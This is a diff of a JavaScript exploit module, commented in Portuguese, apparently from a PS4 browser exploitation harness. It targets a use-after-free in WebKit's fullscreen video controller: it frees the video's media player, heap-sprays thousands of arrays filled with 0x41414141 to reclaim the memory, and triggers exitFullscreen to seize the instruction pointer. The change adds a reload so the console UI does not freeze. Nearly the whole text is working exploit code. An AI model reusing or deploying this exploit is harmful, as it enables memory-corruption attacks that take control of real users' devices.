@@ -1,27 +1,24 @@
+
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Main DOM + Manx Logic)
+ * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Fase de Exploração / Control)
  * Alvo: FullscreenVideoController::exitFullscreen()
  */
 
 export default {
     id:       'VIDEO_FULLSCREEN_REMOVE',
     category: 'Media',
-    risk:     'CRITICAL',
-    description: 'Volta ao setup principal do DOM para herdar o User-Gesture e permitir o Fullscreen automático, injetando o delay do Manx (500ms) e o Heap Spray para sequestro do PC/RIP.',
+    risk:     'HIGH',
+    description: 'Retorno à base estável. Tenta substituir o MediaPlayerPrivate freed com ponteiros falsos (0x41414141). Usa reload para evitar soft-brick da UI.',
 
     setup: async function() {
-        // Usamos o documento principal novamente para garantir o Fullscreen
         this.container = document.createElement('div');
         document.body.appendChild(this.container);
-        
         this.video = document.createElement('video');
         this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
-        
-        // Mantemos os controles ativos caso você queira clicar fisicamente
-        this.video.controls = true; 
         this.container.appendChild(this.video);
 
-        // A munição de Spray: 0x41414141 (Endereço falso para forçar Crash CE-34878-0)
+        // Preparamos a nossa munição de Spray (Uint32Array com ponteiros falsos)
+        // 0x41414141 = "AAAA" (Padrão clássico para ver se controlamos a memória)
         this.sprayPayload = new Uint32Array(256);
         this.sprayPayload.fill(0x41414141);
 
@@ -36,18 +33,16 @@ export default {
 
     trigger: async function() {
         try {
-            // 1. Entra em Fullscreen (O seu código original que funciona direto)
-            if (this.video.webkitRequestFullscreen) {
-                this.video.webkitRequestFullscreen();
-            }
+            // Entra no Fullscreen de forma estável (sem bloqueio)
+            if (this.video.webkitRequestFullscreen) this.video.webkitRequestFullscreen();
+            await new Promise(r => setTimeout(r, 100));
 
-            // 2. O Segredo Manx: Esperamos 500ms para o OrbisOS alocar o player de hardware
-            await new Promise(r => setTimeout(r, 500));
-
-            // 3. FREE: Apagamos o vídeo do DOM. Isto destrói o MediaPlayerPrivate no C++
+            // 1. FREE: Apagamos o vídeo
+            // Observação do Leandro: A thread do JS costuma travar exatamente aqui.
             this.video.remove();
 
-            // 4. REUSE (SPRAY): Preenchemos o buraco na memória instantaneamente
+            // 2. REUSE (SPRAY): Tentamos preencher o buraco deixado pelo vídeo
+            // com 5000 cópias do nosso payload o mais rápido possível
             this.spray = [];
             for (let i = 0; i < 5000; i++) {
                 let arr = new Uint32Array(256);
@@ -55,11 +50,18 @@ export default {
                 this.spray.push(arr);
             }
 
-            // 5. USE: O controlador tenta sair do Fullscreen lendo o player destruído.
-            // Se o Spray funcionou, ele vai ler 0x41414141 e causar um Crash Controlado!
-            if (document.webkitExitFullscreen) {
-                document.webkitExitFullscreen();
-            }
+            // 3. USE: Disparamos o controlador. 
+            // Se ele ler o nosso 0x41414141 como se fosse um ponteiro de função,
+            // a PS4 vai dar crash imediato (CE-34878-0)!
+            if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+
+            // 4. A REDE DE SEGURANÇA (Da V12.00):
+            // Forçamos o recarregamento da página para impedir o congelamento
+            // definitivo da UI da consola. Se o Crash Azul não acontecer,
+            // o navegador apenas reinicia limpo, pronto para nova varredura.
+            setTimeout(() => {
+                location.reload();
+            }, 500);
 
         } catch(e) {}
     },
@@ -75,6 +77,5 @@ export default {
     cleanup: function() {
         try { this.container.remove(); } catch(e) {}
         this.spray = null;
-        this.video = null;
     }
 };
